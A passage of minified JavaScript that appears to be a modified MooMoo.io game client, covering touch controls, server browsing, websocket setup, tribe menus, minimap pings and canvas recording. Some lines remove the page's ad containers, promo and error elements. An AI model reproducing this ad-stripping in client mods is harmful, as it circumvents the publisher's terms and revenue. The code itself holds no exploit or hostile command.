    } else (l = d), (h = c);
    var _ = l.x - o.position.x,
        k = l.y - o.position.y;
    (o.frontPosition = {
        x: _,
        y: k,
    }),
        n.dataOnly ||
        (o.ui.front.style.transform = "translate(" + _ + "px," + k + "px)");
    var v = {
        identifier: o.identifier,
        position: l,
        force: f,
        pressure: t.force || t.pressure || t.webkitForce || 0,
        distance: h,
        angle: {
            radian: p,
            degree: u,
        },
        vector: {
            x: _ / s,
            y: -k / s,
        },
        raw: $,
        instance: o,
        lockX: n.lockX,
        lockY: n.lockY,
    };
    ((v = o.computeDirection(v)).angle = {
        radian: Bn(180 - u),
        degree: 180 - u,
    }),
        o.trigger("move", v),
        this.trigger("move " + o.id + ":move", v);
}),
    (ae.prototype.processOnEnd = function (t) {
    var n = this,
        i = n.options,
        o = n.manager.getIdentifier(t),
        a = n.nipples.get(o),
        r = n.manager.removeIdentifier(a.identifier);
    a &&
        (i.dataOnly ||
         a.hide(function () {
        "dynamic" === i.mode &&
            (a.trigger("removed", a),
             n.trigger("removed " + a.id + ":removed", a),
             n.manager.trigger("removed " + a.id + ":removed", a),
             a.destroy());
    }),
         clearInterval(n.pressureIntervals[a.identifier]),
         a.resetDirection(),
         a.trigger("end", a),
         n.trigger("end " + a.id + ":end", a),
         n.ids.indexOf(a.identifier) >= 0 &&
         n.ids.splice(n.ids.indexOf(a.identifier), 1),
         n.actives.indexOf(a) >= 0 && n.actives.splice(n.actives.indexOf(a), 1),
         /(semi|static)/.test(i.mode)
         ? n.idles.push(a)
         : n.nipples.indexOf(a) >= 0 &&
         n.nipples.splice(n.nipples.indexOf(a), 1),
         n.manager.unbindDocument(),
         /(semi|static)/.test(i.mode) && (n.manager.ids[r.id] = r.identifier));
}),
    (ae.prototype.onDestroyed = function (t, n) {
    this.nipples.indexOf(n) >= 0 &&
        this.nipples.splice(this.nipples.indexOf(n), 1),
        this.actives.indexOf(n) >= 0 &&
        this.actives.splice(this.actives.indexOf(n), 1),
        this.idles.indexOf(n) >= 0 && this.idles.splice(this.idles.indexOf(n), 1),
        this.ids.indexOf(n.identifier) >= 0 &&
        this.ids.splice(this.ids.indexOf(n.identifier), 1),
        this.manager.removeIdentifier(n.identifier),
        this.manager.unbindDocument();
}),
    (ae.prototype.destroy = function () {
    for (var t in (this.unbindEvt(this.options.zone, "start"),
                   this.nipples.forEach(function (t) {
        t.destroy();
    }),
                   this.pressureIntervals))
        this.pressureIntervals.hasOwnProperty(t) &&
            clearInterval(this.pressureIntervals[t]);
    this.trigger("destroyed", this.nipples),
        this.manager.unbindDocument(),
        this.off();
}),
    (de.prototype = new Ve()),
    (de.constructor = de),
    (de.prototype.prepareCollections = function () {
    var t = this;
    (t.collections.create = t.create.bind(t)),
        (t.collections.on = t.on.bind(t)),
        (t.collections.off = t.off.bind(t)),
        (t.collections.destroy = t.destroy.bind(t)),
        (t.collections.get = function (n) {
        var i;
        return (
            t.collections.every(function (t) {
                return !(i = t.get(n));
            }),
            i
        );
    });
}),
    (de.prototype.create = function (t) {
    return this.createCollection(t);
}),
    (de.prototype.createCollection = function (t) {
    var n = new ae(this, t);
    return this.bindCollection(n), this.collections.push(n), n;
}),
    (de.prototype.bindCollection = function (t) {
    var n,
        i = this,
        o = function (t, o) {
            (n = t.type + " " + o.id + ":" + t.type), i.trigger(n, o);
        };
    t.on("destroyed", i.onDestroyed.bind(i)),
        t.on("shown hidden rested dir plain", o),
        t.on("dir:up dir:right dir:down dir:left", o),
        t.on("plain:up plain:right plain:down plain:left", o);
}),
    (de.prototype.bindDocument = function () {
    var t = this;
    t.binded ||
        (t.bindEvt(document, "move").bindEvt(document, "end"), (t.binded = !0));
}),
    (de.prototype.unbindDocument = function (t) {
    var n = this;
    (Object.keys(n.ids).length && !0 !== t) ||
        (n.unbindEvt(document, "move").unbindEvt(document, "end"),
         (n.binded = !1));
}),
    (de.prototype.getIdentifier = function (t) {
    var n;
    return (
        t
        ? void 0 ===
        (n = void 0 === t.identifier ? t.pointerId : t.identifier) &&
        (n = this.latest || 0)
        : (n = this.index),
        void 0 === this.ids[n] && ((this.ids[n] = this.index), (this.index += 1)),
        (this.latest = n),
        this.ids[n]
    );
}),
    (de.prototype.removeIdentifier = function (t) {
    var n = {};
    for (var i in this.ids)
        if (this.ids[i] === t) {
            (n.id = i), (n.identifier = this.ids[i]), delete this.ids[i];
            break;
        }
    return n;
}),
    (de.prototype.onmove = function (t) {
    return this.onAny("move", t), !1;
}),
    (de.prototype.onend = function (t) {
    return this.onAny("end", t), !1;
}),
    (de.prototype.oncancel = function (t) {
    return this.onAny("end", t), !1;
}),
    (de.prototype.onAny = function (t, n) {
    var i,
        o = this,
        a = "processOn" + t.charAt(0).toUpperCase() + t.slice(1);
    n = ao(n);
    var r = function (t, n, i) {
        i.ids.indexOf(n) >= 0 && (i[a](t), (t._found_ = !0));
    },
        s = function (t) {
            (i = o.getIdentifier(t)),
                zn(o.collections, r.bind(null, t, i)),
                t._found_ || o.removeIdentifier(i);
        };
    return zn(n, s), !1;
}),
    (de.prototype.destroy = function () {
    var t = this;
    t.unbindDocument(!0),
        (t.ids = {}),
        (t.index = 0),
        t.collections.forEach(function (t) {
        t.destroy();
    }),
        t.off();
}),
    (de.prototype.onDestroyed = function (t, n) {
    if (0 > this.collections.indexOf(n)) return !1;
    this.collections.splice(this.collections.indexOf(n), 1);
});
const nr = new de(),
      sr = {
          create: function (t) {
              return nr.create(t);
          },
          factory: nr,
      };
let rr = !1;
const Ih = (t) => {
    if (rr) return;
    rr = !0;
    let n = document.getElementById("touch-controls-left"),
        i = sr.create({
            zone: n,
        });
    i.on("start", t.onStartMoving),
        i.on("end", t.onStopMoving),
        i.on("move", t.onRotateMoving);
    let o = document.getElementById("touch-controls-right"),
        a = sr.create({
            zone: o,
        });
    a.on("start", t.onStartAttacking),
        a.on("end", t.onStopAttacking),
        a.on("move", t.onRotateAttacking),
        (n.style.display = "block"),
        (o.style.display = "block");
},
      Mh = {
          enable: Ih,
      };
window.loadedScript = !0;
const Eh =
      "localhost" !== location.hostname &&
      "127.0.0.1" !== location.hostname &&
      !location.hostname.startsWith("192.168."),
      co =
      "sandbox-dev.moomoo.io" === location.hostname ||
      "sandbox.moomoo.io" === location.hostname,
      Ph =
      "dev.moomoo.io" === location.hostname ||
      "dev2.moomoo.io" === location.hostname,
      Hn = new uc();
let ui, di;
const ki =
      "localhost" === location.hostname || "127.0.0.1" === location.hostname,
      Ch = !1,
      ls = ki || !1;
co
    ? ((ui = "https://api-sandbox.moomoo.io"), (di = "moomoo.io"))
: Ph
    ? ((ui = "https://api-dev.moomoo.io"), (di = "moomoo.io"))
: ((ui = "https://api.moomoo.io"), (di = "moomoo.io"));
const Ah = !ls,
      qe = new we(di, 443, T.maxPlayers, 5, Ah);
qe.debugLog = !1;
const Me = {
    animationTime: 0,
    land: null,
    lava: null,
    x: T.volcanoLocationX,
    y: T.volcanoLocationY,
};

function Dh() {
    var t;
    let n = !1;
    return (
        (t = navigator.userAgent || navigator.vendor || window.opera),
        (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(
            t
        ) ||
         /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(
            t.substr(0, 4)
        )) &&
        (n = !0),
        n
    );
}
const ho = Dh();
let vi = !1,
    Fn = !1;

function Oh() {
    !ps ||
        Fn ||
        ((Fn = !0),
         Eh || ls
         ? window.turnstileToken
         ? gn(window.turnstileToken)
         : window.grecaptcha.ready(() => {
        window.grecaptcha
            .execute("6LfahtgjAAAAAF8SkpjyeYMcxMdxIaQeh-VoPATP", {
            action: "homepage",
        })
            .then(function (t) {
            gn("re:" + t);
        })
            .catch(console.error);
    })
         : gn());
}
let Vn = !1,
    WZinfo;

function gn(t) {
    qe.start(
        bi,
        function (n, i, o) {
            let a = "wss://" + n;
            (WZinfo = n),
                t && (a += "?token=" + encodeURIComponent(t)),
                ki && (a = "wss://localhost:3000"),
                ee.connect(
                a,
                function (t) {
                    if (Vn) {
                        Vn = !1;
                        return;
                    }
                    Vo(), t ? bn(t) : ((vi = !0), bs());
                },
                {
                    A: qh,
                    B: bn,
                    C: If,
                    D: Qf,
                    E: KTA.removePlayer,
                    a: KTA.updatePlayers,
                    G: Df,
                    H: qf,
                    I: Kf,
                    J: $f,
                    K: KTA.weaponHit,
                    L: KTA.wiggleObject,
                    M: Xf,
                    N: eu,
                    O: KTA.updateHealth,
                    P: Ef,
                    Q: KTA.objectDeathManager,
                    R: Pf,
                    S: jf,
                    T: Ro,
                    U: Oo,
                    V: To,
                    X: KTA.addProjectile,
                    Y: Yf,
                    Z: ru,
                    g: Zh,
                    1: tf,
                    2: Qh,
                    3: jh,
                    4: ef,
                    5: ff,
                    6: gf,
                    7: af,
                    8: Mf,
                    9: rf,
                    0: su,
                }
            );
        },
        function (t) {
            console.error("Vultr error:", t),
                alert(
                `Error:
    ` + t
            ),
                bn("disconnected");
        },
        ki
    );
}

function cs() {
    return ee.connected;
}

function Rh() {
    let t = prompt("party key", bi);
    t &&
        ((window.onbeforeunload = void 0),
         (window.location.href = "/?server=" + t));
}
const _h = new dc(T),
      fo = Math.PI,
      Ze = 2 * fo;
(Math.lerpAngle = function (t, n, i) {
    Math.abs(n - t) > fo && (t > n ? (n += Ze) : (t += Ze));
    let o = n + (t - n) * i;
    return o >= 0 && o <= Ze ? o : o % Ze;
}),
    (CanvasRenderingContext2D.prototype.roundRect = function (t, n, i, o, a) {
    return (
        i < 2 * a && (a = i / 2),
        o < 2 * a && (a = o / 2),
        a < 0 && (a = 0),
        this.beginPath(),
        this.moveTo(t + a, n),
        this.arcTo(t + i, n, t + i, n + o, a),
        this.arcTo(t + i, n + o, t, n + o, a),
        this.arcTo(t, n + o, t, n, a),
        this.arcTo(t, n, t + i, n, a),
        this.closePath(),
        this
    );
});
let hs;

function Di(t, n) {
    hs && localStorage.setItem(t, n);
}

function Nt(t) {
    return hs ? localStorage.getItem(t) : null;
}
"u" > typeof Storage && (hs = !0);
let xi = Nt("moofoll");

function Bh() {
    xi || ((xi = !0), Di("moofoll", 1));
}
let uo,
    $e,
    mt = 1,
    be,
    It,
    yn,
    or = Date.now(),
    Ee;
const ye = [],
      J = [];
let Oe = [];
const et = [],
      Mt = [],
      po = new gc(Hc, Mt, J, ye, ue, R, T, C),
      ar = new yc(ye, wc, J, R, null, T, C);
let E,
    mo,
    y,
    ct = 1,
    wn = 0,
    go = 0,
    yo = 0,
    Re,
    _e,
    lr,
    fs = 0,
    se = 1.2 * T.maxScreenWidth,
    re = 1.2 * T.maxScreenHeight,
    gt,
    yt,
    Jt = !1;
document.getElementById("ad-container");
const Oi = document.getElementById("mainMenu"),
      Un = document.getElementById("enterGame"),
      kn = document.getElementById("promoImg");
document.getElementById("partyButton");
const vn = document.getElementById("joinPartyButton"),
      Ln = document.getElementById("settingsButton"),
      cr = Ln.getElementsByTagName("span")[0],
      hr = document.getElementById("allianceButton"),
      fr = document.getElementById("storeButton"),
      ur = document.getElementById("chatButton"),
      xt = document.getElementById("gameCanvas"),
      M = xt.getContext("2d"),
      mediaSource = new MediaSource();
mediaSource.addEventListener("sourceopen", handleSourceOpen, !1);
let mediaRecorder,
    recordedBlobs = [],
    sourceBuffer;
const canvas = xt,
      stream = canvas.captureStream(80);

function handleSourceOpen(t) {
    sourceBuffer = mediaSource.addSourceBuffer('video/webm; codecs="hvec"');
}

function handleDataAvailable(t) {
    t.data && t.data.size > 0 && recordedBlobs.push(t.data);
}

function handleStop(t) {
    download();
}
let toggle = !1;

function toggleRecording() {
    !1 == toggle ? startRecording() : stopRecording(), (toggle = !toggle);
}

function startRecording() {
    let t = {
        mimeType: "video/webm",
    };
    recordedBlobs = [];
    try {
        mediaRecorder = new MediaRecorder(stream, t);
    } catch (n) {
        console.log("Unable to create MediaRecorder with options Object: ", n);
        try {
            (t = {
                mimeType: "video/webm;codecs=h265",
            }),
                (mediaRecorder = new MediaRecorder(stream, t));
        } catch (i) {
            console.log("Unable to create MediaRecorder with options Object: ", i);
            try {
                (t = "video/vp8"), (mediaRecorder = new MediaRecorder(stream, t));
            } catch (o) {
                alert(
                    "MediaRecorder is not supported by this browser.\n\nTry Firefox 29 or later, or Chrome 47 or later, with Enable experimental Web Platform features enabled from chrome://flags."
                ),
                    console.error("Exception while creating MediaRecorder:", o);
                return;
            }
        }
    }
    console.log("Created MediaRecorder", mediaRecorder, "with options", t),
        (mediaRecorder.onstop = handleStop),
        (mediaRecorder.ondataavailable = handleDataAvailable),
        mediaRecorder.start(100);
}

function stopRecording() {
    mediaRecorder.stop();
}

function download() {
    let t = new Blob(recordedBlobs, {
        type: "video/webm",
    }),
        n = window.URL.createObjectURL(t),
        i = document.createElement("a");
    (i.style.display = "none"),
        (i.href = n),
        (i.download = "test.mov"),
        document.body.appendChild(i),
        i.click(),
        setTimeout(() => {
        document.body.removeChild(i), window.URL.revokeObjectURL(n);
    }, 100);
}
var zh = document.getElementById("serverBrowser");
const Nn = document.getElementById("nativeResolution"),
      xn = document.getElementById("showPing");
document.getElementById("playMusic");
const Qt = document.getElementById("pingDisplay"),
      dr = document.getElementById("shutdownDisplay"),
      Zt = document.getElementById("menuCardHolder"),
      qt = document.getElementById("guideCard"),
      Et = document.getElementById("loadingText"),
      us = document.getElementById("gameUI"),
      pr = document.getElementById("actionBar"),
      Hh = document.getElementById("scoreDisplay"),
      Fh = document.getElementById("foodDisplay"),
      Vh = document.getElementById("woodDisplay"),
      Uh = document.getElementById("stoneDisplay"),
      Lh = document.getElementById("killCounter"),
      mr = document.getElementById("leaderboardData"),
      lb = document.getElementById("leaderboard"),
      jt = document.getElementById("nameInput"),
      Le = document.getElementById("itemInfoHolder"),
      gr = document.getElementById("ageText"),
      yr = document.getElementById("ageBarBody"),
      ht = document.getElementById("upgradeHolder"),
      ri = document.getElementById("upgradeCounter"),
      Te = document.getElementById("allianceMenu"),
      oi = document.getElementById("allianceHolder"),
      ai = document.getElementById("allianceManager"),
      me = document.getElementById("mapDisplay"),
      Wt = document.getElementById("diedText"),
      Nh = document.getElementById("skinColorHolder"),
      ce = me.getContext("2d");
document.getElementById("promoImgHolder").remove(),
    document.getElementById("skinColorHolder").remove(),
    document.getElementsByClassName("menuHeader")[1].remove(),
    document.getElementById("altServer").remove(),
    document.getElementById("gameName").remove(),
    (Zt.style.transform = "translate(-50%, -40%)"),
    (Zt.style.position = "absolute"),
    (Zt.style.left = "50%"),
    (document.getElementsByClassName("menuText")[3].innerHTML =
     'Originally developed by <a href="https://yendis.ch/" target="_blank" class="menuLink">Yendis</a>, purchased by <a href="https://frvr.com/" target="_blank" class="menuLink">FRVR</a>.'),
    document.getElementById("promoImgHolder")?.remove(),
    document.getElementById("linksContainer2")?.remove(),
    document.getElementById("promoImgHolder")?.remove(),
    document.querySelector("div#menuCard.adCard")?.remove(),
    document.getElementById("adCard")?.remove(),
    document.getElementById("errorNotification")?.remove(),
    document
    .querySelectorAll("div[style*='inline-block']")
    .forEach((t) => (t.style.display = "block")),
    (yr.style.transition = "0.65s ease"),
    (me.width = 300),
    (me.height = 300);
const We = document.getElementById("storeMenu"),
      wr = document.getElementById("storeHolder"),
      ft = document.getElementById("noticationDisplay"),
      Xt = $r.hats,
      Gt = $r.accessories;
var ue = new mc(kc, et, C, T);
const ei = "#525252",
      kr = "#3d3f42",
      Xe = 5.5;

function qh(t) {
    Oe = t.teams;
}
T.DAY_INTERVAL,
    T.DAY_INTERVAL,
    (document.getElementById("bottomContainer").style = `
bottom: 15px;
`);
let ds = !0;
var ps = !1;

function bn(t) {
    (vi = !1), ee.close(), ms(t);
}

function ms(t, n) {
    (Oi.style.display = "block"),
        (us.style.display = "none"),
        (Zt.style.display = "none"),
        (Wt.style.display = "none"),
        (Et.style.display = "block"),
        (Et.innerHTML =
         t +
         (n
          ? "<a href='javascript:window.location.href=window.location.href' class='ytLink'>reload</a>"
          : ""));
}

function Wh() {
    (Qt.hidden = !0),
        (Et.style.display = "none"),
        (Oi.style.display = "block"),
        (Zt.style.display = "block"),
        uf(),
        Xh(),
        Af(),
        (Et.style.display = "none"),
        (Zt.style.display = "block");
    let t = Nt("moo_name") || "";
    !t.length &&
        FRVR.profile &&
        (t = FRVR.profile.name()) &&
        (t += Math.floor(90 * Math.random()) + 9),
        (jt.value = t || "");
}

function Xh() {
    (Un.onclick = C.checkTrusted(function () {
        ms("Connecting..."), cs() ? bs() : Oh();
    })),
        C.hookTouchEvents(Un),
        kn &&
        ((kn.onclick = C.checkTrusted(function () {
        Lo("https://krunker.io/?play=SquidGame_KB");
    })),
         C.hookTouchEvents(kn)),
        vn &&
        ((vn.onclick = C.checkTrusted(function () {
        setTimeout(function () {
            Rh();
        }, 10);
    })),
         C.hookTouchEvents(vn)),
        (Ln.onclick = C.checkTrusted(function () {
        pf();
    })),
        C.hookTouchEvents(Ln),
        (hr.onclick = C.checkTrusted(function () {
        nf();
    })),
        C.hookTouchEvents(hr),
        (fr.onclick = C.checkTrusted(function () {
        hf();
    })),
        C.hookTouchEvents(fr),
        (ur.onclick = C.checkTrusted(function () {
        Mo();
    })),
        C.hookTouchEvents(ur),
        (me.onclick = C.checkTrusted(function () {
        Ao();
    })),
        C.hookTouchEvents(me);
}
(!ls || ki) && (ps = !0),
    (window.onblur = function () {
    ds = !1;
}),
    (window.onfocus = function () {
    (ds = !0), E && E.alive && xs();
}),
    (window.captchaCallbackHook = function () {
    ps = !0;
}),
    window.captchaCallbackComplete && window.captchaCallbackHook(),
    window.addEventListener("keydown", function (t) {
    32 == t.keyCode && t.target == document.body && t.preventDefault();
}),
    (xt.oncontextmenu = function () {
    return !1;
}),
    [
    "touch-controls-left",
    "touch-controls-right",
    "touch-controls-fullscreen",
    "storeMenu",
].forEach((t) => {
    document.getElementById(t) &&
        (document.getElementById(t).oncontextmenu = function (t) {
        t.preventDefault();
    });
});
let bi;
const Gh = {
    view() {
        if (!qe.servers) return;
        let t = 0,
            n = Object.keys(qe.servers).map((n) => {
                let i = qe.regionInfo[n].name,
                    o = 0,
                    a = qe.servers[n].map((t) => {
                        var a;
                        o += t.playerCount;
                        let r = t.selected,
                            s =
                            i + " " + t.name + " [" + Math.min(t.playerCount, 50) + "/50]",
                            l = t.name;
                        t.ping && (null == (a = t.pings) ? void 0 : a.length) >= 2
                            ? (s += ` [${Math.floor(t.ping)}ms]`)
                        : r || (s += " [?]");
                        let c = {
                            value: n + ":" + l,
                        };
                        return (
                            (r ? "selected" : "") && ((bi = n + ":" + l), (c.selected = !0)),
                            Ne("option", c, s)
                        );
                    });
                return (
                    (t += o),
                    [
                        Ne("option[disabled]", `${i} - ${o} players`),
                        a,
                        Ne("option[disabled]"),
                    ]
                );
            });
        return Ne(
            "select",
            {
                value: bi,
                onfocus() {
                    window.blockRedraw = !0;
                },
                onblur() {
                    window.blockRedraw = !1;
                },
                onchange: Kh,
            },
            [n, Ne("option[disabled]", `All Servers - ${t} players`)]
        );
    },
};
Ne.mount(zh, Gh);
const Yh = `${ui}/servers?v=1.22`,
      wo = async () =>
fetch(Yh)
.then((t) => t.json())
.then(async (t) => qe.processServers(t))
.catch((t) => {
    console.error("Failed to load server data with status code:", t);
}),
      $h = () =>
wo()
.then(Wh)
.catch((t) => {
    console.error("Failed to load.");
});
window.frvrSdkInitPromise
    .then(() => window.FRVR.bootstrapper.complete())
    .then(() => $h());
const Kh = (t) => {
    if (
        ((window.blockRedraw = !1), FRVR.channelCharacteristics.allowNavigation)
    ) {
        let [n, i] = t.target.value.split(":");
        qe.switchServer(n, i);
    } else vi && ((vi = !1), (Fn = !1), (Vn = !0), (Ei = !0), ee.close());
};

function Jh() {
    FRVR.ads.show("interstitial", bs);
}

function Se(t, n, i) {
    if (E && t) {
        if (
            (C.removeAllChildren(Le),
             Le.classList.add("visible"),
             C.generateElement({
                id: "itemInfoName",
                text: C.capitalizeFirst(t.name),
                parent: Le,
            }),
             C.generateElement({
                id: "itemInfoDesc",
                text: t.desc,
                parent: Le,
            }),
             !i)
        ) {
            if (n)
                C.generateElement({
                    class: "itemInfoReq",
                    text: t.type ? "secondary" : "primary",
                    parent: Le,
                });
            else {
                for (let o = 0; o < t.req.length; o += 2)
                    C.generateElement({
                        class: "itemInfoReq",
                        html:
                        t.req[o] +
                        "<span class='itemInfoReqVal'> x" +
                        t.req[o + 1] +
                        "</span>",
                        parent: Le,
                    });
                let a = co
                ? t.group.sandboxLimit || Math.max(3 * t.group.limit, 99)
                : t.group.limit;
                t.group.limit &&
                    C.generateElement({
                    class: "itemInfoLmt",
                    text: (E.itemCounts[t.group.id] || 0) + "/" + a,
                    parent: Le,
                });
            }
        }
    } else Le.classList.remove("visible");
}
document.getElementById("pre-content-container"), (window.showPreAd = Jh);
let Pt = [],
    wt = [];

function Qh(t, n) {
    Pt.push({
        sid: t,
        name: n,
    }),
        gs();
}

function gs() {
    if (Pt[0]) {
        let t = Pt[0];
        C.removeAllChildren(ft),
            (ft.style.display = "block"),
            C.generateElement({
            class: "notificationText",
            text: t.name,
            parent: ft,
        }),
            C.generateElement({
            class: "notifButton",
            html: "<i class='material-icons' style='font-size:28px;color:#cc5151;'>&#xE14C;</i>",
            parent: ft,
            onclick: function () {
                Gn(0);
            },
            hookTouch: !0,
        }),
            C.generateElement({
            class: "notifButton",
            html: "<i class='material-icons' style='font-size:28px;color:#8ecc51;'>&#xE876;</i>",
            parent: ft,
            onclick: function () {
                Gn(1);
            },
            hookTouch: !0,
        });
    } else ft.style.display = "none";
}

function Zh(t) {
    Oe.push(t), "block" == Te.style.display && ti();
}
let teamz = [];

function jh(t, n) {
    E && ((E.team = t), (E.isOwner = n), "block" == Te.style.display && ti());
}

function ef(t) {
    (wt = t), "block" == Te.style.display && ti();
}

function tf(t) {
    for (let n = Oe.length - 1; n >= 0; n--) Oe[n].sid == t && Oe.splice(n, 1);
    "block" == Te.style.display && ti();
}

function nf() {
    xs(), "block" != Te.style.display ? ti() : Xn();
}

function Xn() {
    "block" == Te.style.display && (Te.style.display = "none");
}

function ti() {
    if (E && E.alive) {
        if (
            (Ri(),
             (We.style.display = "none"),
             (Te.style.display = "block"),
             C.removeAllChildren(oi),
             E.team)
        )
            for (var t = 0; t < wt.length; t += 2)
                !(function (t) {
                    let n = C.generateElement({
                        class: "allianceItem",
                        style:
                        "color:" + (wt[t] == E.sid ? "#fff" : "rgba(255,255,255,0.6)"),
                        text: wt[t + 1],
                        parent: oi,
                    });
                    E.isOwner &&
                        wt[t] != E.sid &&
                        C.generateElement({
                        class: "joinAlBtn",
                        text: "Kick",
                        onclick: function () {
                            ko(wt[t]);
                        },
                        hookTouch: !0,
                        parent: n,
                    });
                })(t);
        else if (Oe.length)
            for (var t = 0; t < Oe.length; ++t)
                !(function (t) {
                    let n = C.generateElement({
                        class: "allianceItem",
                        style:
                        "color:" +
                        (Oe[t].sid == E.team ? "#fff" : "rgba(255,255,255,0.6)"),
                        text: Oe[t].sid,
                        parent: oi,
                    });
                    C.generateElement({
                        class: "joinAlBtn",
                        text: "Join",
                        onclick: function () {
                            vo(t);
                        },
                        hookTouch: !0,
                        parent: n,
                    });
                })(t);
        else
            C.generateElement({
                class: "allianceItem",
                text: "No Tribes Yet",
                parent: oi,
            });
        C.removeAllChildren(ai),
            E.team
            ? C.generateElement({
            class: "allianceButtonM",
            style: "width: 360px",
            text: E.isOwner ? "Delete Tribe" : "Leave Tribe",
            onclick: function () {
                xo();
            },
            hookTouch: !0,
            parent: ai,
        })
        : (C.generateElement({
            tag: "input",
            type: "text",
            id: "allianceInput",
            maxLength: 7,
            placeholder: "unique name",
            onchange(t) {
                t.target.value = (t.target.value || "").slice(0, 7);
            },
            onkeypress(t) {
                if ("Enter" === t.key) return t.preventDefault(), Yn(), !1;
            },
            parent: ai,
        }),
           C.generateElement({
            tag: "div",
            class: "allianceButtonM",
            style: "width: 140px;",
            text: "Create",
            onclick: function () {
                Yn();
            },
            hookTouch: !0,
            parent: ai,
        }));
    }
}

function Gn(t) {
    ee.send("P", Pt[0].sid, t), Pt.splice(0, 1), gs();
}

function ko(t) {
    ee.send("Q", t);
}

function vo(t) {
    ee.send("b", Oe[t].sid);
}

function Yn() {
    ee.send("L", document.getElementById("allianceInput").value);
}

function xo() {
    (Pt = []), gs(), ee.send("N");
}
let pi, Ht, je;
const bt = [];
let Je;
class DeadPlayer {
    constructor(t, n, i, o, a, r, s, l, c, d) {
        (this.x = t),
            (this.y = n),
            (this.lastDir = i),
            (this.dir = i + Math.PI),
            (this.buildIndex = o),
            (this.weaponIndex = a),
            (this.weaponVariant = r),
            (this.skinColor = s),
            (this.scale = l),
            (this.visScale = 0),
            (this.name = c),
            (this.alpha = 1),
            (this.active = !0),
            (this.deathDir = d),
            (this.animate = function (t) {
            let n = C.getAngleDist(this.lastDir, this.dir);
            n > 0.01 ? (this.dir += n / 20) : (this.dir = this.lastDir),
                this.visScale < this.scale &&
                ((this.visScale += t / (this.scale / 2)),
                 this.visScale >= this.scale && (this.visScale = this.scale)),
                (this.alpha -= t / 3e3),
                this.alpha <= 0 && ((this.alpha = 0), (this.active = !1));
        });
    }
}

function addDeadPlayer(t) {
    deadPlayers.push(
        new DeadPlayer(
            t.x,
            t.y,
            t.dir,
            t.buildIndex,
            t.weaponIndex,
            t.weaponVariant,
            t.skinColor,
            t.scale,
            t.name,
            t.deathDir
        )
    );
}

function sf() {
    (this.init = function (t, n) {
        (this.scale = 0), (this.x = t), (this.y = n), (this.active = !0);
    }),
        (this.update = function (t, n) {
        this.active &&
            ((this.scale += 0.05 * n),
             this.scale >= T.mapPingScale
             ? (this.active = !1)
             : ((t.globalAlpha = 1 - Math.max(0, this.scale / T.mapPingScale)),
                t.beginPath(),
                t.arc(
            (this.x / T.mapScale) * me.width,
            (this.y / T.mapScale) * me.width,
            this.scale,
            0,
            2 * Math.PI
        ),
                t.stroke()));
    });
}

function rf(t, n) {
    for (let i = 0; i < bt.length; ++i)
        if (!bt[i].active) {
            Je = bt[i];
            break;
        }
    Je || ((Je = new sf()), bt.push(Je)), Je.init(t, n);
}

function of() {
    je || (je = {}), (je.x = E.x), (je.y = E.y);
}

function af(t) {
    Ht = t;
}

function lf(t) {
    if (E && E.alive) {
        ce.clearRect(0, 0, me.width, me.height),
            (ce.strokeStyle = "#fff"),
            (ce.lineWidth = 4);
        for (var n = 0; n < bt.length; ++n) (Je = bt[n]).update(ce, t);
        if (
            ((ce.globalAlpha = 1),
             (ce.fillStyle = "#fff"),
             Q(
                (E.x / T.mapScale) * me.width,
                (E.y / T.mapScale) * me.height,
                7,
                ce,
                !0
            ),
             (ce.fillStyle = "rgba(255,255,255,0.35)"),
             E.team && Ht)
        )
            for (var n = 0; n < Ht.length; )
                Q(
